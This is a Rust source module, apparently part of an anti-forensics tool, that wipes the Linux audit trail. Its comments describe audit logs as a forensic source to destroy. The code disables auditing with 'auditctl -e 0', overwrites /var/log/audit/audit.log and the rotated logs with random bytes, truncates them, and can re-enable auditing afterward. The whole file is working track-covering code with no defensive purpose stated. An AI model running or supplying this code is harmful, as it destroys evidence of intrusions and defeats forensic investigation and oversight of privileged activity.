/*
 * auditd.rs — Linux audit log sanitization
 *
 * auditd records all privileged operations (file opens, syscalls, logins)
 * in /var/log/audit/audit.log. These logs are a primary forensic source.
 *
 * Strategy:
 *   1. auditctl -e 0  — disable auditing temporarily (no new records)
 *   2. Wipe/replace audit log files
 *   3. auditctl -e 1  — re-enable (optional)
 *
 * Requires CAP_AUDIT_CONTROL (effectively root).
 *
 * Note: auditd holds /var/log/audit/audit.log open. We cannot unlink it
 * while auditd is running. Options:
 *  a) Truncate in-place (auditd will keep writing to the same fd — works)
 *  b) service auditd stop → wipe → start (noisy but thorough)
 *  c) Use log_poison's destroy_file() which truncates in-place
 */

use std::process::Command;
use std::fs;
use glob::glob;

use crate::Result;

// ── auditctl ──────────────────────────────────────────────────────────────────

pub fn auditctl_disable() -> bool {
    Command::new("auditctl")
        .args(["-e", "0"])
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

pub fn auditctl_enable() -> bool {
    Command::new("auditctl")
        .args(["-e", "1"])
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

// ── Wipe audit log files ──────────────────────────────────────────────────────

fn overwrite_and_truncate(path: &str) -> Result<()> {
    use std::io::Write;
    use crate::fill_random;

    let meta = match fs::metadata(path) {
        Ok(m) => m,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Err(e) => return Err(e.to_string()),
    };

    let size = meta.len();
    let mut f = fs::OpenOptions::new()
        .write(true)
        .open(path)
        .map_err(|e| format!("open {}: {}", path, e))?;

    if size > 0 {
        let mut buf = [0u8; 4096];
        let mut done = 0u64;
        while done < size {
            let n = ((size - done) as usize).min(4096);
            fill_random(&mut buf[..n]);
            f.write_all(&buf[..n]).map_err(|e| e.to_string())?;
            done += n as u64;
        }
    }

    f.set_len(0).map_err(|e| e.to_string())?;
    Ok(())
}

// ── Public API ────────────────────────────────────────────────────────────────

#[derive(Debug, Default)]
pub struct AuditStats {
    pub disabled:       bool,
    pub files_wiped:    u32,
    pub errors:         u32,
}

pub fn wipe_audit_logs(reenable: bool, stats: &mut AuditStats) -> Result<()> {
    // Disable new audit records
    if auditctl_disable() {
        eprintln!("[+] auditd: auditing disabled (auditctl -e 0)");
        stats.disabled = true;
    } else {
        eprintln!("[!] auditd: auditctl -e 0 failed (not installed or no permission)");
        stats.errors += 1;
    }

    // Wipe current log
    let current = "/var/log/audit/audit.log";
    if std::path::Path::new(current).exists() {
        match overwrite_and_truncate(current) {
            Ok(()) => {
                eprintln!("[+] auditd: {} wiped", current);
                stats.files_wiped += 1;
            }
            Err(e) => {
                eprintln!("[!] auditd: {}: {}", current, e);
                stats.errors += 1;
            }
        }
    }

    // Wipe rotated logs: audit.log.1, audit.log.2, ...
    for pattern in &["/var/log/audit/audit.log.*", "/var/log/audit/*.log"] {
        if let Ok(entries) = glob(pattern) {
            for entry in entries.flatten() {
                if let Some(p) = entry.to_str() {
                    if p == current { continue; }
                    match overwrite_and_truncate(p) {
                        Ok(()) => { stats.files_wiped += 1; }
                        Err(e) => {
                            eprintln!("[!] auditd: {}: {}", p, e);
                            stats.errors += 1;
                        }
                    }
                }
            }
        }
    }

    if reenable {
        if auditctl_enable() {
            eprintln!("[+] auditd: re-enabled (auditctl -e 1)");
        } else {
            eprintln!("[!] auditd: re-enable failed");
        }
    }

    eprintln!("[+] auditd: {} file(s) wiped, {} error(s)",
        stats.files_wiped, stats.errors);
    Ok(())
}
